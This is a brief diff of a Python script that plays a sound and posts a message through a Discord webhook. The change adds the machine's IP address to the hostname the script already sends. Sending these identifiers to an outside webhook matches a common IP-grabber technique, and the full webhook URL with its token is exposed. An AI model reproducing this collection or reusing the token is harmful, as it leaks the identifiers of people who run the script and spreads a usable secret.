@@ -27,7 +27,7 @@ pc = socket.gethostname()
 
 
 
-webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1193494516418740345/vwTwT9DLSjlpX1jqMs0rMbIkCtqzrJuuQ-d2QCtnb16vmvD5sQal1cv_rmLwaXm4sOpO", content="Webhook triggered by " + pc)
+webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1193494516418740345/vwTwT9DLSjlpX1jqMs0rMbIkCtqzrJuuQ-d2QCtnb16vmvD5sQal1cv_rmLwaXm4sOpO", content="Webhook triggered by " + pc + " " + ip)
 response = webhook.execute()
 winsound.PlaySound('chipi.wav', 0)
 
